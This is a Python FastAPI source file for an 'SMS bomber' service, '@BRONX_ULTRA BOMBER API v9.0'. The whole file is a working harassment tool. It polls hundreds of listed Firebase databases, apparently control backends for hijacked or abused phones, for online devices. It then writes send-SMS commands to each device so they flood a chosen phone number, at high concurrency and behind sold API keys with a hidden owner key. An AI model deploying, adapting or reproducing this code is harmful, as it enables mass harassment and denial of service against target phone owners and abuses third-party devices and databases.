#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v9.0 — ULTRA FLASH        ║
║   ▸ OWNER KEY: bronx-boss (hidden power)                ║
║   ▸ Device ID dedupe (no double-send)                   ║
║   ▸ Instant stop (per-request break)                    ║
║   ▸ Firebase URLs HIDDEN from public                    ║
║   ▸ Render / UptimeRobot ready                          ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS  (public keys)
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
}

# 👑 OWNER HIDDEN KEY — sirf tumhare paas
OWNER_KEY = "bronx-boss"

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — ADD 100-500+ HERE
#   Format: "https://xxx-default-rtdb.region.firebasedatabase.app"
#   Comma se alag karo — duplicates auto-remove honge
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS_RAW = [
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
        "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    "https://adityakaapp-default-rtdb.firebaseio.com",
    "https://amaat-a7916-default-rtdb.firebaseio.com",
    "https://amit-6f40a-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://bali-7acc3-default-rtdb.firebaseio.com",
    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com",
    "https://botsieeee-af07c-default-rtdb.firebaseio.com",
    "https://gadhalalund-default-rtdb.firebaseio.com",
    "https://iiilsoee-default-rtdb.firebaseio.com",
    "https://lucky-c0915-default-rtdb.firebaseio.com",
    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://nidhi-rani-default-rtdb.firebaseio.com",
    "https://nowammyxdd-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://rohitbona-d8308-default-rtdb.firebaseio.com",
    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com",
    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://alwaysatiif7-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://check-skyler-default-rtdb.firebaseio.com",
    "https://chilgumsir-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://deepk-hh-default-rtdb.firebaseio.com",
    "https://desert-fc320-default-rtdb.firebaseio.com",
    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
    "https://gfaatelisell-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://kalih-f389d-default-rtdb.firebaseio.com",
    "https://keepsnss-default-rtdb.firebaseio.com",
    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
    "https://maxo12-default-rtdb.firebaseio.com",
    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
    "https://mook-1ddfc-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "https://sk-paid-panel-default-rtdb.firebaseio.com",
    "https://tinmur-777e8-default-rtdb.firebaseio.com",
    "https://vasu-new-panel-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
    "https://adani-5dd2c-default-rtdb.firebaseio.com",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://kunal-86274-default-rtdb.firebaseio.com",
    "https://sunil-da-default-rtdb.firebaseio.com",
    "https://rk-panell-default-rtdb.firebaseio.com",
    "https://jime-10a55-default-rtdb.firebaseio.com",
    "https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
    "https://saaasaa-c28c1-default-rtdb.firebaseio.com",
    "https://room-hotel-default-rtdb.firebaseio.com",
    "https://subjuoeh-default-rtdb.firebaseio.com",
    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://kunal-86274-default-rtdb.firebaseio.com",
    "https://fwwg-d04bc-default-rtdb.firebaseio.com",
    "https://alok5u2-default-rtdb.firebaseio.com",
    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://project9-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
     "https://dhiraj2323-2409a-default-rtdb.firebaseio.com",
"https://hush-e1f72-default-rtdb.firebaseio.com",
"https://a4jaat-208cb-default-rtdb.firebaseio.com",
"https://babuji-efd18-default-rtdb.firebaseio.com",
"https://sk-paid-panel-default-rtdb.firebaseio.com",
"https://saniapanel-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://sumnmmn-default-rtdb.firebaseio.com",
"https://arunhah-902ef-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://pm-kishan-b4-default-rtdb.firebaseio.com",
"https://rahulbhai-ff15445-default-rtdb.firebaseio.com",
"https://svuhgfgg-default-rtdb.firebaseio.com",
"https://pussy-25f3c-default-rtdb.firebaseio.com",
"https://aryanhaisharma-f2739-default-rtdb.firebaseio.com",
"https://ramji-be5c6-default-rtdb.firebaseio.com",
"https://fir-project-175f2-default-rtdb.firebaseio.com",
"https://santosh-3eeca-default-rtdb.firebaseio.com",
"https://ariyan-kelvin-default-rtdb.firebaseio.com",
"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
"https://rosan-9a68d-default-rtdb.firebaseio.com",
"https://sohan-6d9e1-default-rtdb.firebaseio.com",
"https://davil-d4e77-default-rtdb.firebaseio.com",
"https://ramchandra62-51fbe-default-rtdb.firebaseio.com",
"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
"https://aya-wed-anvith-default-rtdb.firebaseio.com",
"https://babu-2b2c2-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://pm-kisan-15jg-default-rtdb.firebaseio.com",
"https://mkdmoo-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://helloooookk-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://fir-d327e-default-rtdb.firebaseio.com",
"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://suman-7a301-default-rtdb.firebaseio.com",
"https://ship-admin-panel-da53b-default-rtdb.firebaseio.com",
"https://aditya-5959e-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://customer4-ca47c-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://gadhalalund-default-rtdb.firebaseio.com",
"https://sachin-38c1d-default-rtdb.firebaseio.com",
"https://sirsaa-ea24e-default-rtdb.firebaseio.com",
"https://customer-19no-10augu-default-rtdb.firebaseio.com",
"https://gasbooking-15494-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://bibli-roy-default-rtdb.firebaseio.com",
"https://ssboss4-default-rtdb.firebaseio.com",
"https://rahulrnj-6e235-default-rtdb.firebaseio.com",
"https://gollsrka-default-rtdb.firebaseio.com",
"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
"https://room-hotel-default-rtdb.firebaseio.com",
"https://dhiko0909-default-rtdb.firebaseio.com",
"https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
"https://teddymcdonald-81002-default-rtdb.firebaseio.com",
"https://santosh-c4095-default-rtdb.firebaseio.com",
"https://alok5u2-default-rtdb.firebaseio.com",
"https://saaasaa-c28c1-default-rtdb.firebaseio.com",
"https://subjuoeh-default-rtdb.firebaseio.com",
"https://fwwg-d04bc-default-rtdb.firebaseio.com",
"https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
"https://kunal-86274-default-rtdb.firebaseio.com",
"https://rk-panell-default-rtdb.firebaseio.com",
"https://sunil-da-default-rtdb.firebaseio.com",
"https://jime-10a55-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://sannn-5d617-default-rtdb.firebaseio.com",
"https://fir-24851-default-rtdb.firebaseio.com",
"https://mxla-16265-default-rtdb.firebaseio.com",
"https://warsondk-default-rtdb.firebaseio.com",
"https://lvdapanalb-default-rtdb.firebaseio.com",
"https://senu-cbca6-default-rtdb.firebaseio.com",
"https://rahul-admin-b6ebe-default-rtdb.firebaseio.com",
"https://simran-2f56c-default-rtdb.firebaseio.com",
"https://panel-jack-default-rtdb.firebaseio.com",
"https://dippsanj-4fe1c-default-rtdb.firebaseio.com",
"https://akshhhhhhhh-default-rtdb.firebaseio.com",
"https://kaha-9d4ce-default-rtdb.firebaseio.com",
"https://super-admin-240f4-default-rtdb.firebaseio.com",
"https://ilohsh-default-rtdb.firebaseio.com",
    "https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://a4jaat-208cb-default-rtdb.firebaseio.com",
"https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://sanjay-16691-default-rtdb.firebaseio.com",
"https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com",
"https://saniapanel-default-rtdb.firebaseio.com",
"https://sumnmmn-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://crdio-3cf5c-default-rtdb.firebaseio.com",
"https://sk-paid-panel-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
"https://himanmi-936db-default-rtdb.firebaseio.com",
"https://ariyan-kelvin-default-rtdb.firebaseio.com",
"https://pm-kishan-b4-default-rtdb.firebaseio.com",
"https://hyper-cheat-3f53a-default-rtdb.firebaseio.com",
"https://fir-e8ad7-default-rtdb.firebaseio.com",
"https://davil-d4e77-default-rtdb.firebaseio.com",
"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
"https://santosh-3eeca-default-rtdb.firebaseio.com",
"https://ramchandra62-51fbe-default-rtdb.firebaseio.com",
"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
"https://pm-kisan-15jg-default-rtdb.firebaseio.com",
"https://mkdmoo-default-rtdb.firebaseio.com",
"https://rosan-9a68d-default-rtdb.firebaseio.com",
"https://aya-wed-anvith-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://babu-2b2c2-default-rtdb.firebaseio.com",
"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://pnb-one-a13-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://helloooookk-default-rtdb.firebaseio.com",
"https://suman-7a301-default-rtdb.firebaseio.com",
"https://aditya-5959e-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://customer4-ca47c-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://fir-d327e-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://ship-admin-panel-da53b-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://gadhalalund-default-rtdb.firebaseio.com"
"https://sachin-38c1d-default-rtdb.firebaseio.com",
"https://customer-19no-10augu-default-rtdb.firebaseio.com",
"https://sirsaa-ea24e-default-rtdb.firebaseio.com",
"https://gasbooking-15494-default-rtdb.firebaseio.com",
"https://jime-10a55-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://fir-24851-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://nisha-randi-default-rtdb.firebaseio.com",
"https://yohichahiye-default-rtdb.firebaseio.com",
"https://krisna574-ffef3-default-rtdb.firebaseio.com",
"https://lvdapanalb-default-rtdb.firebaseio.com",
"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
"https://warsondk-default-rtdb.firebaseio.com",
"https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://teligrampmsell-default-rtdb.firebaseio.com",
"https://fir-d327e-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://mpariwhan-default-rtdb.firebaseio.com",
"https://aaaa-3bd33-default-rtdb.firebaseio.com",
"https://mxla-16265-default-rtdb.firebaseio.com",
"https://navin-9fb56-default-rtdb.firebaseio.com",
"https://ilohsh-default-rtdb.firebaseio.com",
"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://babuji-efd18-default-rtdb.firebaseio.com",
"https://dhiraj2323-2409a-default-rtdb.firebaseio.com",
"https://saniapanel-default-rtdb.firebaseio.com",
"https://crdio-3cf5c-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://ariyan-kelvin-default-rtdb.firebaseio.com",
"https://himanmi-936db-default-rtdb.firebaseio.com",
"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
"https://rosan-9a68d-default-rtdb.firebaseio.com",
"https://davil-d4e77-default-rtdb.firebaseio.com",
"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
"https://babu-2b2c2-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://mkdmoo-default-rtdb.firebaseio.com",
"https://aya-wed-anvith-default-rtdb.firebaseio.com",
"https://helloooookk-default-rtdb.firebaseio.com",
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://a4jaat-208cb-default-rtdb.firebaseio.com"
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://aaaa-3bd33-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
"https://warsondk-default-rtdb.firebaseio.com",
"https://yohichahiye-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://teligrampmsell-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://krisna574-ffef3-default-rtdb.firebaseio.com",
"https://lvdapanalb-default-rtdb.firebaseio.com",
"https://a4jaat-208cb-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",

]

# Auto-clean + dedupe
def _clean(u: str) -> str:
    u = u.strip().rstrip("/")
    if u.endswith(".json"):
        u = u[:-5]
    return u.rstrip("/")

FIREBASE_URLS = list(dict.fromkeys(_clean(u) for u in FIREBASE_URLS_RAW if u.strip()))

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT   = 3000
REQUEST_TIMEOUT  = 6
CONNECT_TIMEOUT  = 3
DEVICE_CACHE_TTL = 30
FETCH_TIMEOUT    = 15

API_NAME    = "@BRONX_ULTRA"
API_VERSION = "9.0"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(title=f"🔥 {API_NAME} BOMBER API", version=API_VERSION)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# 🔴 REDIS (optional)
# ═══════════════════════════════════════════════════════════
redis = None
try:
    REDIS_URL   = os.getenv("UPSTASH_REDIS_REST_URL")
    REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
    if REDIS_URL and REDIS_TOKEN:
        from upstash_redis.asyncio import Redis
        redis = Redis(url=REDIS_URL, token=REDIS_TOKEN)
        print("✅ Redis connected")
except Exception as e:
    print(f"⚠️ Redis skipped: {e}")
    redis = None

# ═══════════════════════════════════════════════════════════
# 🧠 STATE
# ═══════════════════════════════════════════════════════════
_LOCAL_STOP  = set()
_ACTIVE_JOBS = {}   # number -> {"stop": bool}
_DEVICE_CACHE = {"devices": None, "ts": 0}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY HELPERS
# ═══════════════════════════════════════════════════════════
def verify_key(k: str) -> bool:
    return bool(k) and k.strip() in VALID_KEYS

def is_owner(k: str) -> bool:
    return bool(k) and k.strip() == OWNER_KEY

def valid_or_owner(k: str) -> bool:
    return verify_key(k) or is_owner(k)

def extract_key(request: Request, q: dict, b: dict) -> str:
    k = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if k: return k.strip()
    a = request.headers.get("authorization", "")
    if a.lower().startswith("bearer "): return a[7:].strip()
    k = q.get("key") or q.get("api_key")
    if k: return str(k).strip()
    k = b.get("key") or b.get("api_key")
    if k: return str(k).strip()
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ MESSAGE FIX
# ═══════════════════════════════════════════════════════════
def fix_message(raw, is_get: bool) -> str:
    if raw is None: return ""
    if not isinstance(raw, str): raw = str(raw)
    msg = raw
    if is_get:
        msg = msg.replace("+", " ")
    msg = msg.replace("\\n", "\n").replace("\\t", "\t")
    return msg.strip()


# ═══════════════════════════════════════════════════════════
# 📡 FETCH + DEDUPE DEVICES
# ═══════════════════════════════════════════════════════════
async def _fetch_one(session, base):
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            out = []
            for k, v in data.items():
                if isinstance(v, dict) and v.get("status") is True:
                    out.append({"id": k, "url": base})
            return out
    except Exception:
        return []


async def get_all_devices(session, use_cache=True):
    if use_cache:
        if _DEVICE_CACHE["devices"] and (time.time() - _DEVICE_CACHE["ts"]) < DEVICE_CACHE_TTL:
            return _DEVICE_CACHE["devices"]

    results = await asyncio.gather(
        *[_fetch_one(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )

    # ✅ DEDUPE BY DEVICE ID  →  count multiply nahi hoga
    seen = set()
    unique = []
    for r in results:
        if not isinstance(r, list): continue
        for d in r:
            did = d["id"]
            if did in seen: continue
            seen.add(did)
            unique.append(d)

    _DEVICE_CACHE["devices"] = unique
    _DEVICE_CACHE["ts"] = time.time()
    return unique


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE (with instant stop check)
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, stats, job):
    if job["stop"]:                     # ⚡ instant break
        return False

    payload = {
        "from": 1,
        "to": target,
        "message": message,
        "isSended": False,
        "timestamp": int(time.time() * 1000),
    }

    for ep in SEND_ENDPOINTS:
        if job["stop"]:
            return False
        url = f"{device['url']}/{ep.format(id=device['id'])}"
        try:
            async with session.put(url, json=payload) as r:
                if r.status in (200, 201):
                    stats["success"] += 1
                    return True
                if r.status == 403:
                    stats["blocked"] += 1
                    return False
        except Exception:
            continue

    stats["failed"] += 1
    return False


# ═══════════════════════════════════════════════════════════
# 💣 WORKER — ULTRA FLASH ⚡
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    job = {"stop": False}
    _ACTIVE_JOBS[number] = job

    if redis:
        try: await redis.delete(f"stop:{number}")
        except Exception: pass
    _LOCAL_STOP.discard(number)

    connector = aiohttp.TCPConnector(
        limit=0, limit_per_host=0, ttl_dns_cache=600,
        force_close=False, enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
    }

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
            devices = await get_all_devices(session, use_cache=True)
            if not devices:
                print(f"[{jid}] ❌ No devices online")
                return

            ndev = len(devices)
            total = ndev * count

            print(f"\n{'='*60}")
            print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — ULTRA FLASH")
            print(f"[{jid}] Key        : {api_key}")
            print(f"[{jid}] Target     : {number}")
            print(f"[{jid}] Message    : {message[:60]}")
            print(f"[{jid}] Devices    : {ndev} (deduped)")
            print(f"[{jid}] Per-device : {count}")
            print(f"[{jid}] TOTAL SMS  : {total}")
            print(f"{'='*60}")

            stats = {"success": 0, "failed": 0, "blocked": 0}
            batch = []
            completed = 0

            for device in devices:
                if job["stop"] or await is_stopped(number):
                    job["stop"] = True
                    break
                for _ in range(count):
                    if job["stop"]:
                        break
                    batch.append(asyncio.create_task(
                        send_one(session, device, number, message, stats, job)
                    ))
                    if len(batch) >= MAX_CONCURRENT:
                        await asyncio.gather(*batch, return_exceptions=True)
                        completed += len(batch)
                        batch.clear()
                        el = time.time() - t0
                        spd = round(stats["success"] / el, 1) if el else 0
                        print(f"[{jid}] ⚡ {completed} sent | OK={stats['success']} | "
                              f"BLK={stats['blocked']} | {el:.1f}s | {spd}/s")

            if batch and not job["stop"]:
                await asyncio.gather(*batch, return_exceptions=True)
                completed += len(batch)

            el = round(time.time() - t0, 2)
            spd = round(stats["success"] / el, 1) if el else 0

            print(f"\n[{jid}] {'🛑 STOPPED' if job['stop'] else '✅ DONE'}")
            print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
                  f"Blocked={stats['blocked']}")
            print(f"[{jid}] Time={el}s | Speed={spd}/s 🚄🚄🚄\n")

    finally:
        _ACTIVE_JOBS.pop(number, None)


async def is_stopped(number: str) -> bool:
    if number in _LOCAL_STOP: return True
    if redis:
        try:
            v = await redis.get(f"stop:{number}")
            return v is not None
        except Exception:
            return False
    return False


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "protected": True,
        "redis": "connected" if redis else "off",
        "mode": "ULTRA FLASH — deduped fan-out",
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=1",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
        },
        "tip": "POST JSON for full emoji/symbol support 🎯",
    }


@app.get("/health")
async def health():
    return {"api": API_NAME, "version": API_VERSION, "status": "ok",
            "time": datetime.now().isoformat()}


@app.get("/keys")
async def keys_info():
    # 🚫 No key count, no hint about owner key
    return {"api": API_NAME, "status": "protected",
            "message": "Contact admin for a valid key"}


# ═══════════════════════════════════════════════════════════
# 🚀 /send
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"
    q = dict(request.query_params)

    b = {}
    if not is_get:
        try: b = await request.json()
        except Exception:
            try:
                f = await request.form()
                b = dict(f)
            except Exception:
                b = {}

    merged = {**q, **b}

    api_key = extract_key(request, q, b)
    if not api_key:
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "🔑 API key required"}, status_code=401)
    if not valid_or_owner(api_key):
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "❌ Invalid API key"}, status_code=401)

    message = fix_message(merged.get("message") or merged.get("msg") or "", is_get)
    number  = str(merged.get("number") or merged.get("num") or merged.get("numer") or "").strip()
    cnt_s   = merged.get("count", "1")

    if not message:
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "Missing message"}, 400)
    if not number:
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "Missing number"}, 400)

    clean = number.replace("+","").replace(" ","").replace("-","")
    if not clean.isdigit() or len(clean) < 10:
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "Invalid number"}, 400)

    try:
        count = int(cnt_s)
        if count <= 0: raise ValueError
    except Exception:
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "invalid count"}, 400)

    bg.add_task(bomb_worker, clean, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "target": clean,
        "message_sent": message,
        "message_length": len(message),
        "per_device": count,
        "mode": "ULTRA FLASH (deduped)",
        "stop_url": f"/stop?key={api_key}&number={clean}",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(request: Request, number: str = Query(None), key: str = Query(None)):
    api_key = (key or request.headers.get("x-api-key") or "").strip()
    if not api_key:
        a = request.headers.get("authorization", "")
        if a.lower().startswith("bearer "): api_key = a[7:].strip()

    if not valid_or_owner(api_key):
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "🔑 Valid key required"}, status_code=401)
    if not number:
        return JSONResponse({"success": False, "api": API_NAME,
                             "error": "number required"}, 400)

    number = number.strip().replace("+","").replace(" ","").replace("-","")
    _LOCAL_STOP.add(number)

    # ⚡ Instant in-memory stop
    if number in _ACTIVE_JOBS:
        _ACTIVE_JOBS[number]["stop"] = True

    if redis:
        try: await redis.set(f"stop:{number}", "1", ex=300)
        except Exception: pass

    return {"success": True, "api": API_NAME,
            "message": f"🛑 Stop signal sent for {number}", "number": number}


# ═══════════════════════════════════════════════════════════
# 📱 /devices — OWNER ONLY (URLs hidden from public)
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = (key or request.headers.get("x-api-key") or "").strip()
    if not api_key:
        a = request.headers.get("authorization", "")
        if a.lower().startswith("bearer "): api_key = a[7:].strip()

    if not is_owner(api_key):
        # public gets nothing sensitive
        return JSONResponse(
            {"success": False, "api": API_NAME,
             "error": "🔒 Owner access only"},
            status_code=403,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=FETCH_TIMEOUT, connect=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
        devices = await get_all_devices(s, use_cache=False)

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices": devices,
    }


